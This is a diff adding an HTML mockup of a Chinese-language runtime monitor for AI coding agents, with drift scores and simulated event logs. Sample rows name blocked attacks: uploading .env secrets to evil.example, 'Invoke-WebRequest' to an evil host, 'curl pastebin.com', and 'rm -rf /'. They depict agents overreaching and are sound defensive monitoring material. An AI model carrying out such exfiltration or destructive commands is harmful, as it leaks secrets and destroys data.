@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="zh-CN"><head>
+<meta charset="utf-8">
+<meta name="viewport" content="initial-scale=1">
+<title>AIDR — 行为监控 (优化版)</title>
+<style>
+:root{font-family:"Segoe UI","Microsoft YaHei",Arial,sans-serif;color:#18212f;background:#f2f4f7;font-size:14px;letter-spacing:0}
+*{box-sizing:border-box}body{margin:0;min-width:320px;background:#f2f4f7}
+button{font:inherit;border:1px solid #cbd2da;background:#fff;color:#243142;border-radius:6px;padding:7px 11px;cursor:pointer;font-size:12px}
+button:hover{background:#f4f6f8}
+.badge{display:inline-flex;align-items:center;padding:3px 7px;border-radius:5px;font-size:11px;font-weight:600;background:#eef1f4;color:#495464}
+.badge.allow{background:#e6f4ef;color:#237a66}
+.badge.alert{background:#fff2d8;color:#8b5400}
+.badge.block{background:#fdebea;color:#b42318}
+.badge.model{background:#e6f4ef;color:#237a66}.badge.rules{background:#fff2d8;color:#8b5400}.badge.none{background:#eef1f4;color:#687385}
+.muted{color:#687385}.good{color:#237a66}.warn{color:#a35b00}.bad{color:#b42318}
+select{font:inherit;border:1px solid #cbd2da;border-radius:5px;background:#fff;padding:5px 8px;color:#243142;font-size:12px}
+
+.app{display:grid;grid-template-columns:224px minmax(0,1fr);min-height:100vh}
+.sidebar{background:#171c24;color:#d8dee8;padding:20px 12px}
+.brand{padding:0 10px 20px;border-bottom:1px solid #343b47}.brand h1{font-size:20px;margin:0;color:#fff}.brand p{margin:5px 0 0;color:#8fd5c4;font-size:12px}
+nav{display:grid;gap:4px;padding-top:18px}.nav-btn{border:0;background:transparent;color:#adb7c6;text-align:left;padding:10px 12px;border-radius:6px;cursor:pointer;font-size:13px}.nav-btn:hover,.nav-btn.active{background:#29313d;color:#fff}
+.main{min-width:0}.topbar{height:56px;padding:0 24px;background:#fff;border-bottom:1px solid #dfe3e8;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:2}
+.content{padding:20px 24px 40px;max-width:1400px;margin:0 auto}
+
+/* Stats strip */
+.stat-strip{display:grid;grid-template-columns:repeat(5,1fr);gap:10px;margin-bottom:16px}
+.stat{background:#fff;border:1px solid #dfe3e8;border-radius:7px;padding:11px 13px}
+.stat span{display:block;color:#687587;font-size:10px}
+.stat b{display:block;font-size:20px;margin-top:4px;color:#182536}
+.stat small{display:block;color:#84909c;font-size:10px;margin-top:2px}
+.stat.warn b{color:#b56c08}.stat.live b{color:#167769}.stat.bad b{color:#b42318}
+
+/* Drift panel */
+.drift-panel{background:#fff;border:1px solid #dfe3e8;border-radius:7px;margin-bottom:16px}
+.drift-head{padding:12px 15px;border-bottom:1px solid #e7eaee;display:flex;justify-content:space-between;align-items:center}
+.drift-head h3{margin:0;font-size:13px}
+.drift-body{padding:14px 15px}
+.drift-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:10px}
+.drift-item{border:1px solid #e7eaee;border-radius:6px;padding:10px}
+.drift-top{display:flex;justify-content:space-between;align-items:center;margin-bottom:6px}
+.drift-label{font-size:11px;font-weight:600}
+.drift-state{font-size:9px;font-weight:800;padding:2px 6px;border-radius:4px}
+.drift-state.pass{background:#e6f4ef;color:#237a66}
+.drift-state.review{background:#fff2d8;color:#8b5400}
+.drift-state.block{background:#fdebea;color:#b42318}
+.drift-bar{height:5px;background:#e7eaee;border-radius:3px;overflow:hidden;margin-bottom:4px}
+.drift-bar i{height:100%;display:block;border-radius:3px}
+.drift-pct{font-size:10px;color:#687385}
+.drift-foot{display:flex;justify-content:space-between;align-items:center;margin-top:12px;padding-top:10px;border-top:1px solid #e7eaee;font-size:11px;color:#687385}
+.drift-score-num{font-size:22px;font-weight:700}
+.drift-score-num.good{color:#237a66}.drift-score-num.warn{color:#b56c08}.drift-score-num.bad{color:#b42318}
+
+/* Timeline */
+.tl-panel{background:#fff;border:1px solid #dfe3e8;border-radius:7px;margin-bottom:16px}
+.tl-head{padding:12px 15px;border-bottom:1px solid #e7eaee;display:flex;justify-content:space-between;align-items:center}
+.tl-head h3{margin:0;font-size:13px}
+.tl-body{padding:6px 10px;max-height:340px;overflow-y:auto}
+.tl-item{display:grid;grid-template-columns:60px 50px 1fr 70px;gap:8px;padding:8px 8px;border-radius:5px;font-size:12px;align-items:center;cursor:pointer}
+.tl-item:hover{background:#f8f9fb}
+.tl-item .t{color:#84909c;font-size:11px}
+.tl-item .s{color:#2c4050}
+.tl-item .src{font-size:10px;text-align:right}
+.tl-item.block{border-left:3px solid #b42318}
+.tl-item.alert{border-left:3px solid #c27300}
+.tl-item.allow{border-left:3px solid #2b9079}
+
+/* Sparkline */
+.spark-wrap{margin-top:10px;height:32px}
+
+/* Event table */
+.ev-panel{background:#fff;border:1px solid #dfe3e8;border-radius:7px}
+.ev-head{padding:12px 15px;border-bottom:1px solid #e7eaee;display:flex;justify-content:space-between;align-items:center}
+.ev-head h3{margin:0;font-size:13px}
+.ev-toolbar{display:flex;gap:8px;align-items:center;flex-wrap:wrap;padding:10px 15px;border-bottom:1px solid #e7eaee}
+.ev-body{padding:0;overflow:auto}
+table{width:100%;border-collapse:collapse;font-size:11px}
+th,td{padding:9px 10px;border-bottom:1px solid #edf0f2;text-align:left;vertical-align:top}
+th{font-size:10px;color:#687385;background:#f7f9fa;font-weight:600;white-space:nowrap}
+tr.clickable{cursor:pointer}tr.clickable:hover{background:#f5fbf9}
+.empty{padding:42px 18px;text-align:center;color:#7a8594;font-size:12px}
+
+@media(max-width:960px){
+  .app{grid-template-columns:74px minmax(0,1fr)}.brand h1{font-size:15px}.brand p,.nav-btn span{display:none}.nav-btn{font-size:0;text-align:center}.nav-btn::first-letter{font-size:14px}
+  .drift-grid{grid-template-columns:1fr 1fr}.stat-strip{grid-template-columns:repeat(3,1fr)}
+}
+@media(max-width:640px){
+  .drift-grid,.stat-strip{grid-template-columns:1fr 1fr}.tl-item{grid-template-columns:55px 1fr}
+}
+</style>
+</head><body>
+<div class="app">
+<aside class="sidebar">
+<div class="brand"><h1>AIDR</h1><p>Zero Trust Runtime</p></div>
+<nav>
+<div class="nav-btn">概览</div>
+<div class="nav-btn">会话</div>
+<div class="nav-btn">AI Agents</div>
+<div class="nav-btn">策略</div>
+<div class="nav-btn active">行为</div>
+<div class="nav-btn">Semantic Model</div>
+<div class="nav-btn">系统</div>
+</nav>
+</aside>
+<div class="main">
+<div class="topbar"><h2 style="font-size:16px;margin:0">行为监控</h2><div class="live" style="display:flex;align-items:center;gap:6px;font-size:12px;color:#167769;font-weight:600"><span class="dot" style="width:7px;height:7px;border-radius:50%;background:#2fa184;display:inline-block"></span> Baseline learning</div></div>
+<div class="content">
+
+<!-- Stats strip -->
+<div class="stat-strip">
+<div class="stat"><span>活跃会话</span><b>24</b></div>
+<div class="stat live"><span>正常</span><b>162</b></div>
+<div class="stat warn"><span>告警</span><b>3</b></div>
+<div class="stat bad"><span>阻断</span><b>18</b></div>
+<div class="stat"><span>基线偏离度</span><b class="warn">12</b><small>↑ 较昨日 +3</small></div>
+</div>
+
+<!-- Drift panel -->
+<div class="drift-panel">
+<div class="drift-head"><h3>🧬 行为基线漂移分析 <span style="font-size:10px;color:#687385;font-weight:400">BehaviorDriftEngine · 实时</span></h3><select><option>最近24小时</option></select></div>
+<div class="drift-body">
+<div class="drift-grid">
+<div class="drift-item">
+<div class="drift-top"><span class="drift-label">目标一致性</span><span class="drift-state pass">PASS</span></div>
+<div class="drift-bar"><i style="width:96%;background:#237a66"></i></div>
+<div class="drift-pct">96% · 当前行为仍然围绕已识别任务目标</div>
+</div>
+<div class="drift-item">
+<div class="drift-top"><span class="drift-label">能力增量</span><span class="drift-state review">REVIEW</span></div>
+<div class="drift-bar"><i style="width:62%;background:#a35b00"></i></div>
+<div class="drift-pct">62% · 检测到未在候选策略中的能力请求 (shell+network)</div>
+</div>
+<div class="drift-item">
+<div class="drift-top"><span class="drift-label">行为顺序</span><span class="drift-state pass">PASS</span></div>
+<div class="drift-bar"><i style="width:85%;background:#237a66"></i></div>
+<div class="drift-pct">85% · 行为链顺序与历史基线一致</div>
+</div>
+<div class="drift-item">
+<div class="drift-top"><span class="drift-label">数据边界</span><span class="drift-state pass">PASS</span></div>
+<div class="drift-bar"><i style="width:100%;background:#237a66"></i></div>
+<div class="drift-pct">100% · 工作区和数据边界保持稳定</div>
+</div>
+</div>
+<div class="drift-foot">
+<div><span class="drift-score-num warn">12</span><span style="font-size:11px">/100 基线偏离度</span> &nbsp; <span class="muted">触发告警阈值: 20</span> &nbsp; <span class="muted">阻断阈值: 70</span></div>
+<div><span class="muted" style="font-size:10px">检测到 3 次漂移事件 · <a href="#" style="color:#176f62" onclick="return false">查看全部 →</a></span></div>
+</div>
+<div class="spark-wrap"><svg width="100%" height="28" viewBox="0 0 400 28" preserveAspectRatio="none"><polyline fill="none" stroke="#a35b00" stroke-width="1.5" points="0,24 20,22 40,26 60,18 80,22 100,14 120,24 140,18 160,22 180,10 200,26 220,16 240,22 260,8 280,20 300,14 320,18 340,22 360,10 380,16 400,20"/><polyline fill="none" stroke="#237a66" stroke-width="1" opacity=".35" points="0,14 400,14"/><text x="8" y="8" fill="#687385" font-size="7">漂移趋势 · 过去24h</text></svg></div>
+</div>
+</div>
+
+<!-- Timeline -->
+<div class="tl-panel">
+<div class="tl-head"><h3>⏱️ 行为时间线 <span style="font-size:10px;color:#687385;font-weight:400">取代重复的 SVG 图谱 · 从 EventBus 实时注入</span></h3><button onclick="addTimelineItem()">模拟事件</button></div>
+<div class="tl-body" id="timeline">
+<div class="tl-item block"><span class="t">12:23:47</span><span class="badge block">BLOCK</span><span class="s">密钥外传阻断: .env → evil.example</span><span class="src"><span class="badge model">model</span></span></div>
+<div class="tl-item alert"><span class="t">12:23:35</span><span class="badge alert">ALERT</span><span class="s">curl pastebin.com 不在域名白名单</span><span class="src"><span class="badge rules">rules</span></span></div>
+<div class="tl-item allow"><span class="t">12:23:12</span><span class="badge allow">ALLOW</span><span class="s">ReadFile server.js (已授权路径)</span><span class="src"><span class="badge none">rules</span></span></div>
+<div class="tl-item alert"><span class="t">12:22:58</span><span class="badge alert">ALERT</span><span class="s">行为漂移: 能力从 fileRead 扩展到 shell+network</span><span class="src"><span class="badge model">model</span></span></div>
+<div class="tl-item allow"><span class="t">12:22:40</span><span class="badge allow">ALLOW</span><span class="s">意图分析: "修复 API 认证模块" · risk=medium(35)</span><span class="src"><span class="badge rules">rules</span></span></div>
+</div>
+</div>
+
+<!-- Event table -->
+<div class="ev-panel">
+<div class="ev-head"><h3>📋 行为事件</h3><span class="muted" style="font-size:11px">4列精简版 · 点击行展开详情</span></div>
+<div class="ev-toolbar">
+<select><option value="">全部 Agent</option><option>codex-vm-01</option><option>opencode-ws-01</option></select>
+<select><option value="">全部会话</option></select>
+<select><option value="">全部判决</option><option>allow</option><option>alert</option><option>block</option></select>
+<span class="muted" style="font-size:11px;margin-left:auto">共 97 条 · 展示最近 50 条</span>
+</div>
+<div class="ev-body">
+<table>
+<thead><tr><th style="width:130px">时间</th><th style="width:70px">类型</th><th>行为</th><th style="width:70px">来源</th><th style="width:60px">判决</th></tr></thead>
+<tbody>
+<tr class="clickable"><td>2026/7/21 12:23:47</td><td><span class="badge block" style="font-size:10px">secret</span></td><td>密钥外传阻断: .env → evil.example/upload · 规则 secret_exposure</td><td><span class="badge model">model</span></td><td><span class="badge block">block</span></td></tr>
+<tr class="clickable"><td>2026/7/21 12:23:35</td><td><span class="badge alert" style="font-size:10px">network</span></td><td>curl pastebin.com 不在域名白名单中 · codex-vm-01</td><td><span class="badge rules">rules</span></td><td><span class="badge alert">alert</span></td></tr>
+<tr class="clickable"><td>2026/7/21 12:23:12</td><td><span class="badge allow" style="font-size:10px">file</span></td><td>ReadFile server.js (已授权路径) · codex-vm-01</td><td><span class="badge none">rules</span></td><td><span class="badge allow">allow</span></td></tr>
+<tr class="clickable"><td>2026/7/21 12:22:58</td><td><span class="badge alert" style="font-size:10px">drift</span></td><td>行为漂移: fileRead → shell+network (score=25) · 检测到能力升级</td><td><span class="badge model">model</span></td><td><span class="badge alert">alert</span></td></tr>
+<tr class="clickable"><td>2026/7/21 12:22:40</td><td><span class="badge allow" style="font-size:10px">intent</span></td><td>"修复 API 认证模块" · risk=medium(35) · fileRead+shell+network</td><td><span class="badge rules">rules</span></td><td><span class="badge allow">allow</span></td></tr>
+<tr class="clickable"><td>2026/7/21 12:20:15</td><td><span class="badge allow" style="font-size:10px">process</span></td><td>Agent process: codex.exe (PID 12345) · codex-vm-01</td><td><span class="badge none">¬</span></td><td><span class="badge allow">allow</span></td></tr>
+<tr class="clickable"><td>2026/7/21 12:18:30</td><td><span class="badge block" style="font-size:10px">mcp</span></td><td>MCP 工具调用 write_file 不在授权列表 · codex-vm-01</td><td><span class="badge rules">rules</span></td><td><span class="badge block">block</span></td></tr>
+<tr class="clickable"><td>2026/7/21 12:15:42</td><td><span class="badge alert" style="font-size:10px">network</span></td><td>Invoke-WebRequest https://evil.example.com/upload · codex-vm-01</td><td><span class="badge model">model</span></td><td><span class="badge block">block</span></td></tr>
+</tbody>
+</table>
+</div>
+</div>
+
+</div></div></div>
+
+<script>
+// Simulated live timeline events (matching EventBus pattern)
+const tl = document.getElementById('timeline');
+const samples = [
+  {t:'12:24:02',v:'allow',s:'npm install express 包下载放行',src:'rules'},
+  {t:'12:23:55',v:'alert',s:'MCP tools/list 新工具发现',src:'model'},
+  {t:'12:23:47',v:'block',s:'密钥外传阻断 secret_exposure',src:'model'}
+];
+let ei = 0;
+setInterval(() => {
+  const e = samples[ei % samples.length];
+  const d = document.createElement('div');
+  d.className = `tl-item ${e.v}`;
+  d.innerHTML = `<span class="t">${e.t}</span><span class="badge ${e.v}">${e.v.toUpperCase()}</span><span class="s">${e.s}</span><span class="src"><span class="badge ${e.src}">${e.src}</span></span>`;
+  tl.insertBefore(d, tl.firstChild);
+  if (tl.children.length > 8) tl.removeChild(tl.lastChild);
+  ei++;
+}, 4000);
+
+// Manual add
+function addTimelineItem() {
+  const d = document.createElement('div');
+  const now = new Date();
+  const t = now.toTimeString().slice(0,8);
+  const events = [
+    {v:'allow',s:'npm test 运行放行',src:'rules'},
+    {v:'alert',s:'新域名请求 api.external.com',src:'model'},
+    {v:'block',s:'rm -rf / 危险命令阻断',src:'rules'}
+  ];
+  const e = events[Math.floor(Math.random()*events.length)];
+  d.className = `tl-item ${e.v}`;
+  d.innerHTML = `<span class="t">${t}</span><span class="badge ${e.v}">${e.v.toUpperCase()}</span><span class="s">${e.s}</span><span class="src"><span class="badge ${e.src}">${e.src}</span></span>`;
+  tl.insertBefore(d, tl.firstChild);
+  if (tl.children.length > 8) tl.removeChild(tl.lastChild);
+}
+</script>
+</body></html>
